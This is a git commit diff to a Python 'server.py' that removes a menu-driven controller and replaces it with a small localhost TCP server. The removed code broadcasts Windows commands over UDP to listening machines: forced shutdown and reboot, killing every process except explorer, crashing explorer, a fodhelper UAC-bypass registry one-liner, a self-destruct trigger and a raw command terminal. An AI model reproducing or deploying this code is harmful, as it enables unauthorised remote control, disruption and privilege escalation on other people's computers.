7b589030b786e5f8d104e24137b0f526f6de577d
lif28 <160417499+Lif28@users.noreply.github.com>
2025-01-15 10:00:00 +0100

    Update server.py

--- python/1.1/server.py
+++ python/1.1/server.py
@@ -1,129 +1,41 @@
 import socket
-import sys
 import os
 
+def server():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    HOST = "127.0.0.1"
+    PORT = 46283
 
-BROADCAST_IP = "255.255.255.255"  
-PORT = 45326   
+    server.bind((HOST, PORT))
+    server.listen(0)
+    print(f"Listening on {HOST}:{PORT}")
 
+    client_socket, client_address = server.accept()
+    print(f"accepted connection from {client_address[0]}:{client_address[1]}")
 
-
-def shutdownWin():
-
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-    message = 'shutdown /s /f /t 0'
-    sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-    print("Command Executed")
-
-def rebootWin():
-
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  
-    message = 'shutdown /r /f /t 0'
-    sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-    print("Command Executed")
-
-
-def RickRoll():
-
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1) 
-    message = 'start https://www.youtube.com/watch?v=dQw4w9WgXcQ'
-    sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-    print("Command Executed")
-
-
-def KillEmAll():
-
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1) 
-    message = 'powershell -Command "Get-Process | Where-Object { $_.Name -ne \"explorer\" } | ForEach-Object { $_.Kill() }"'
-    sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-    print("Command Executed")
-
-
-def Crash():
-
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1) 
-    message = 'taskkill /f /im explorer.exe'
-    sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-    print("Command Executed")
-
-
-def UACBypass():
-
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  
-    message = 'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe'
-    sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-    print("Command Executed")
-
-
-def Terminal():
-
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  
-    print("Type 'Leave' to exit")
     while True:
-        message = input()
-        if message.lower() == "leave":
-            break
-        else:
-            sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-            print("Command Executed")
+        #recive 1024 bites of data from the client
+        #req = client_socket.recv(1024)
+        #req = req.decode("utf-8") #convert
+
+        a = input("input: ")
+        client_socket.sendall(a.encode("utf-8")[:1024])
+
+        #if req.lower() == "close":
+         #   client_socket.send("closed".encode("utf-8")) #send a message that close connection
+          #  break
+
+        #print(f"recived: {req}")
 
 
-def self_destruct():
 
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  
-    message = 'self_destruct'
-    sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-    print("Command Executed")
-# 
-sub_menu_options = [
-    "Shutdown",
-    "Reboot",
-    "RickRoll",
-    "Kill All Process",
-    "Crash",
-    "SELF DESTRUCTION",
-    "UACBypass",
-    "Cmd",
-    "Exit"
-]
+        #normal response that sends the client (to the server) when we want to connect
+        response = "accepted".encode("utf-8")
+        client_socket.send(response)
 
+    #close the connection
+    client_socket.close()
+    print("connection closed")
+    server.close()
 
-if __name__ == "__main__":
-    while True:
-        print("\n--- MENU ---")
-        for i, option in enumerate(sub_menu_options):
-            print(f"{i + 1}. {option}")
-
-        try:
-            choice = int(input("Select the option: ")
-            if choice == 1:
-                shutdownWin()
-            elif choice == 2:
-                rebootWin()
-            elif choice == 3:
-                RickRoll()
-            elif choice == 4:
-                KillEmAll()
-            elif choice == 5:
-                Crash()
-            elif choice == 6:
-                self_destruct()
-            elif choice == 7:
-                UACBypass()
-            elif choice == 8:
-                Terminal()
-            elif choice == 9:
-                print("Exit", 3)
-                break
-            else:
-                print("Not a valid option.")
-        except ValueError:
-            print("Not a valid input")
+server()
